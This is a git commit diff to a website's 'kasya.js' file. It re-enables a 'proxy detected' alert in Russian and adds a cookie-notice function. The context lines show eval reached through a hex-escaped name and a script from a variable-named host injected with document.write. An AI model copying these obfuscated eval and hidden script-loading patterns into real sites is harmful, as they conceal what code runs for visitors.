9d1adfbf6ba6b3fa33f1789e55b1d61164bfaea5
Kasya Team <70856891+kasyateam@users.noreply.github.com>
2021-07-13 15:43:19 +0600

    Update kasya.js

--- assets/kasyateam/js/kasya.js
+++ assets/kasyateam/js/kasya.js
@@ -23,8 +23,25 @@ document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"
 //Kasya Security
 a = this["\x65\x76\x61\x6C"];
 if (window.location.hostname !== "kasyateam"){
-  //a(alert('У вас обнаружен Proxy! Мы не позволяем работать с ним.'))
+  a(alert('У вас обнаружен Proxy! Мы не позволяем работать с ним.'))
 }
 else {
  alert('ok') 
 }
+function checkCookies(){
+    let cookieDate = localStorage.getItem('cookieDate');
+    let cookieNotification = document.getElementById('cookie_notification');
+    let cookieBtn = cookieNotification.querySelector('.cookie_accept');
+
+    // Если записи про кукисы нет или она просрочена на 1 год, то показываем информацию про кукисы
+    if( !cookieDate || (+cookieDate + 31536000000) < Date.now() ){
+        cookieNotification.classList.add('show');
+    }
+
+    // При клике на кнопку, в локальное хранилище записывается текущая дата в системе UNIX
+    cookieBtn.addEventListener('click', function(){
+        localStorage.setItem( 'cookieDate', Date.now() );
+        cookieNotification.classList.remove('show');
+    })
+}
+checkCookies();
